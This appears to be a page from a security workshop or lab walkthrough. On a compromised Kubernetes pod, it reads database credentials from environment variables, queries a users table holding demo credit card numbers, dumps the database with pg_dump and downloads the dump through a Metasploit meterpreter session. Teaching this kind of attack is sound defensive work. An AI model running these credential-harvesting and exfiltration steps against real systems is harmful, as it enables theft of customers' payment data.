---
id: exploit_host
title: Exploiting the remote host
sidebar_label: Exploit
---

## Exploiting the host

Now that we have access to the target host, lets see if there is anything interesting configured in the environment.  
If we take a look at the environment variables, we can see that this is a pod running on Kubernetes and that there are several other services in the same namespace.

We can see the Kubernetes API server, a payment service, a search service (which judging by the HOSTNAME appears to be the host we have gotten access to), and a database service including connection details.

Eventhough the database credentials were retrieved from a Kubernetes secret, they are still available to us as plain text in the environment variables.

```shell
env

# truncated output

HOSTNAME=search-54fc49cd9d-b7nx7

SEARCH_SERVICE_HOST=10.43.38.166
SEARCH_SERVICE_PORT=9090

PAYMENTS_SERVICE_HOST=10.43.70.143
PAYMENTS_SERVICE_PORT=9090

KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_SERVICE_PORT=443

DATABASE_SERVICE_HOST=10.43.6.193
DATABASE_SERVICE_PORT=5432
DATABASE_USER=root
DATABASE_PASSWORD=please_change_me_barry
```

We can install a postgres client on the host and try to connect to the database host with the found credentials.

```shell
apt update && apt install -y postgresql-client
```

Since the database details are stored in environment variables, we can just use the variables themselves as values.

```shell
PGPASSWORD=$DATABASE_PASSWORD psql -h $DATABASE_SERVICE_HOST -p $DATABASE_SERVICE_PORT -U $DATABASE_USER -w -d $DATABASE_NAME
```

Now that we have access to the database, we can see if there is anything interesting in there.  
We can inspect the databases..

```shell
\l

                             List of databases
   Name    | Owner | Encoding |  Collate   |   Ctype    | Access privileges
-----------+-------+----------+------------+------------+-------------------
 postgres  | root  | UTF8     | en_US.utf8 | en_US.utf8 |
 template0 | root  | UTF8     | en_US.utf8 | en_US.utf8 | =c/root          +
           |       |          |            |            | root=CTc/root
 template1 | root  | UTF8     | en_US.utf8 | en_US.utf8 | =c/root          +
           |       |          |            |            | root=CTc/root
 users     | root  | UTF8     | en_US.utf8 | en_US.utf8 |
(4 rows)
```

the users..

```shell
\du+

                                          List of roles
 Role name |                         Attributes                         | Member of | Description
-----------+------------------------------------------------------------+-----------+-------------
 root      | Superuser, Create role, Create DB, Replication, Bypass RLS | {}        |
```

the tables..

```shell
\d

            List of relations
 Schema |     Name     |   Type   | Owner
--------+--------------+----------+-------
 public | users        | table    | root
 public | users_id_seq | sequence | root
(2 rows)
```

and finally the data of any tables we are interested in.

```shell
SELECT * FROM users;

 id |    name     |   creditcard   | ccv
----+-------------+----------------+-----
  1 | Nic Jackson | 1234-5678-9012 | 123
  2 | Erik Veld   | 5678-9012-1234 | 567
(2 rows)
```

Lets exit out of the postgres client..

```shell
\q
```

and grab a dump of the database including all the user data and creditcard information.

```shell
PGPASSWORD=$DATABASE_PASSWORD pg_dump -h $DATABASE_SERVICE_HOST -p $DATABASE_SERVICE_PORT -U $DATABASE_USER -w $DATABASE_NAME > backup.sql
```

We can now close the remote shell..

```shell
exit

meterpreter >
```

and download the file to our local machine.

```shell
meterpreter > download backup.sql

[*] Downloading: backup.sql -> backup.sql
[*] Downloaded 2.37 KiB of 2.37 KiB (100.0%): backup.sql -> backup.sql
[*] download   : backup.sql -> backup.sql
```

Lets background the session, so we can interact with it again at a later date.

```shell
meterpreter > background

[*] Backgrounding session 1...
msf6 exploit(multi/handler) >
```
